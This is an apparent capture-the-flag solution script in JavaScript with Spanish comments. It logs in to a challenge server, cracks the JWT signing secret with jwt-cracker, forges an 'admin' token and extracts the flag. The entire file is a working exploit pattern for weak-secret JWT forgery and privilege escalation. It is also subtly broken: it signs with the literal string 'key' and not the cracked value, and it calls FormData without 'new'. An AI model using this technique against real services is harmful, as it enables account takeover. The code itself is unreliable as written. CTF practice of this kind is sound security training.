import { $ } from "bun"; // igual que google/zx
import { SignJWT } from "jose";

const host = "<>";

// Se inicia sesión con cualquier usuario
const loginForm = FormData();
loginForm.append("username", "random");
const loginRes = await fetch(`${host}?action=login`, { body: loginForm, method: "POST", redirect: "manual" });

// Se obtiene el token a partir de las cookies
const token = /token=(.*?);/.exec(loginRes.headers.get("set-cookie"))[1];

// Se ejecuta el cracker para obtener la clave
const crackedLogs = await $`pnpm exec jwt-cracker --token ${token}`.text();
const key = crackedLogs.match(/SECRET FOUND: (.*)/)[1];
console.log(`Key cracked: ${key}`);

// Se codifica un token a partir de la clave crackeada usando usuario admin
const encodedKey = new TextEncoder().encode("key");
const jwt = await new SignJWT({ username: "admin" }).setProtectedHeader({ alg: "HS256" }).sign(encodedKey);
console.log(`Attack JWT: ${jwt}`);

// Se ataca el servidor con el token crackeado
const attackRes = await fetch(`${host}`, { headers: { cookie: `token=${jwt};` } });
const attackText = await attackRes.text();
const flag = /hack\.ing\{[A-Za-z0-9_]*\}/.exec(attackText)[0];

console.log(`FLag: ${flag}`);
